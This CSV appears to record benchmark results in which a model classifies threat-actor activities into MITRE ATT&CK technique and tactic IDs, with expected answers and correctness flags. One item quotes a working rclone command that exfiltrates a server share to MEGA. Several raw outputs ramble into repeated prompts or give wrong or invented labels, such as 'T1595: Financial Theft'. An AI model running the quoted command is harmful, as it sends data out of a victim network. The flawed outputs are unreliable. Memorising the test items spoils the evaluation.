ID,model_prompt,raw_model_output,model_output,expected_technique,expected_tactic,actual_technique,actual_tactic,correct_technique,correct_tactic,both_correct
54,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.

Output:",technique=T1567.002: Exfiltration to Cloud Storage | tactic=TA0010: Exfiltration,technique=T1567.002: Exfiltration to Cloud Storage | tactic=TA0010: Exfiltration,T1567.002,TA0010,T1567.002,TA0010,True,True,True
55,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: TYPEFRAME can gather the disk volume information.

Output:",Technique=T1082: System Information Discovery | Tactic=TA0007: Discovery,Technique=T1082: System Information Discovery | Tactic=TA0007: Discovery,T1082,TA0007,T1082,TA0007,True,True,True
56,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.

Output:",Technique=T1027.013: Encrypted/Encoded File | Tactic=TA0005: Defense Evasion,Technique=T1027.013: Encrypted/Encoded File | Tactic=TA0005: Defense Evasion,T1027.013,TA0005,T1027.013,TA0005,True,True,True
57,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.

Output:",Technique=T1133: External Remote Services | Tactic=TA0003 ; TA0001: Persistence ; Initial Access,Technique=T1133: External Remote Services | Tactic=TA0003 ; TA0001: Persistence ; Initial Access,T1133,"TA0001,TA0003",T1133,"TA0001,TA0003",True,True,True
58,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: SideTwist can encrypt C2 communications with a randomly generated key.

Output:",T1573.001: Symmetric Cryptography | T1573: Cryptography | Techniques: T1573.001: Symmetric Cryptography,T1573.001: Symmetric Cryptography | T1573: Cryptography | Techniques: T1573.001: Symmetric Cryptography,T1573.001,TA0011,"T1573,T1573.001",,True,False,False
59,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.

Output:","Technique=T1584.001: Domains | Tactic=TA0042: Resource Development

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.

Output: Technique=T1584.001: Domains | Tactic=TA0042: Resource Development

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity:",Technique=T1584.001: Domains | Tactic=TA0042: Resource Development,T1584.001,TA0042,T1584.001,TA0042,True,True,True
60,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: ZLib communicates over HTTP for C2.

Output:",Technique=T1071.001: Web Protocols | Tactic=TA0011: Command and Control,Technique=T1071.001: Web Protocols | Tactic=TA0011: Command and Control,T1071.001,TA0011,T1071.001,TA0011,True,True,True
61,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: build_downer has the ability to add itself to the Registry Run key for persistence.

Output:","T1547.001: Registry Run Keys / Startup Folder | Persistence

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: APT32 has used a tool to delete files from a compromised host.

Output: T1070.004: File Deletion | Privilaged Account Activity | Persistence | Initial Access | Reconnaissance | Defense Evasion | Discovery | Command and Control | Credential Access | Network Connection Discovery | Remote Services | System Service Discovery | System Service Manipulation | System Service Execution | System Shutdown/Reboot",T1547.001: Registry Run Keys / Startup Folder | Persistence,T1547.001,"TA0003,TA0004",T1547.001,,True,False,False
62,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Machete collects stored credentials from several web browsers.

Output:",Technique=T1555.003: Credentials from Web Browsers | Tactic=TA0006: Credential Access,Technique=T1555.003: Credentials from Web Browsers | Tactic=TA0006: Credential Access,T1555.003,TA0006,T1555.003,TA0006,True,True,True
63,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: FinFisher probes the system to check for antimalware processes.

Output:","Technique=T1518.001: Security Software Discovery | Tactic=TA0007: Discovery

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: FIN8 has used a tool to enumerate running processes.

Output: Technique=T1057: Process Discovery | Tactic=TA0007: Discovery

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: FIN8 has used a tool to enumerate running processes.

Output: Technique=T105",Technique=T1518.001: Security Software Discovery | Tactic=TA0007: Discovery,T1063,TA0007,T1518.001,TA0007,False,True,False
64,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: SocGholish has been distributed through compromised websites with malicious content often masquerading as browser updates.

Output:","T1189: Drive-by Compromise

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: SocGholish has been distributed through malicious links.

Output: T1204.001: Malicious Link | T1566.002: Spearphishing Link

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: SocGholish has been distributed through malicious documents.

Output: T1204.003: Malicious",T1189: Drive-by Compromise,T1189,TA0001,T1189,,True,False,False
65,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: menuPass has used Putty Secure Copy Client (PSCP) to transfer data.

Output:",Technique=T1133: External Remote Services | Tactic=TA0003 ; TA0001: Persistence ; Initial Access,Technique=T1133: External Remote Services | Tactic=TA0003 ; TA0001: Persistence ; Initial Access,T1021.004,TA0008,T1133,"TA0001,TA0003",False,False,False
66,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: LazyScripter has used GitHub to host its payloads to operate spam campaigns.

Output:",Technique=T1608.001: Upload Malware | Tactic=TA0042: Resource Development,Technique=T1608.001: Upload Malware | Tactic=TA0042: Resource Development,T1102,TA0011,T1608.001,TA0042,False,False,False
67,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.

Output:",Technique=T1140: Deobfuscate/Decode Files or Information | Tactic=TA0005: Defense Evasion,Technique=T1140: Deobfuscate/Decode Files or Information | Tactic=TA0005: Defense Evasion,T1140,TA0005,T1140,TA0005,True,True,True
68,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: LAPSUS$ has payed employees, suppliers, and business partners of target organizations for credentials.

Output:","T1595: Financial Theft

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: LAPSUS$ has used stolen credentials to access and exfiltrate data from victim networks.

Output: TA0005: Defense Evasion

instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: LAPSUS$ has used stolen credentials to access and exfiltrate data from victim networks.

Output: TA0005: Defense Evasion

instruction: Which MITRE ATT&",T1595: Financial Theft,T1586.002,TA0042,T1595,,False,False,False
69,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.

Output:",Technique=T1078: Valid Accounts | Tactic=TA0005 ; TA0003 ; TA0004 ; TA0001: Defense Evasion ; Persistence ; Privilege Escalation ; Initial Access,Technique=T1078: Valid Accounts | Tactic=TA0005 ; TA0003 ; TA0004 ; TA0001: Defense Evasion ; Persistence ; Privilege Escalation ; Initial Access,T1078,"TA0001,TA0003,TA0004,TA0005",T1078,"TA0001,TA0003,TA0004,TA0005",True,True,True
70,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Catchamas captures screenshots based on specific keywords in the window’s title.

Output:",Technique=T1113: Screen Capture | Tactic=TA0009: Collection,Technique=T1113: Screen Capture | Tactic=TA0009: Collection,T1113,TA0009,T1113,TA0009,True,True,True
71,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: ThiefQuest obtains a list of running processes using the function <code>kill_unwanted</code>.

Output:",Technique=T1057: Process Discovery | Tactic=TA0007: Discovery,Technique=T1057: Process Discovery | Tactic=TA0007: Discovery,T1057,TA0007,T1057,TA0007,True,True,True
72,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.

Output:",Technique=T1003.003: NTDS | Tactic=TA0006: Credential Access,Technique=T1003.003: NTDS | Tactic=TA0006: Credential Access,T1003.003,TA0006,T1003.003,TA0006,True,True,True
73,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: Woody RAT can make `Ping` GET HTTP requests to its C2 server at regular intervals for network connectivity checks.

Output:",Technique=T1016.001: Internet Connection Discovery | Tactic=TA0007: Discovery,Technique=T1016.001: Internet Connection Discovery | Tactic=TA0007: Discovery,T1016.001,TA0007,T1016.001,TA0007,True,True,True
74,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.

Output:",Technique=T1505.003: Web Shell | Tactic=TA0003: Persistence,Technique=T1505.003: Web Shell | Tactic=TA0003: Persistence,T1505.003,TA0003,T1505.003,TA0003,True,True,True
75,"instruction: Which MITRE ATT&CK technique and tactic (including their IDs) does this activity demonstrate?

input: Activity: Activity: FlawedAmmyy can capture screenshots.

Output:",Technique=T1113: Screen Capture | Tactic=TA0009: Collection,Technique=T1113: Screen Capture | Tactic=TA0009: Collection,T1113,TA0009,T1113,TA0009,True,True,True
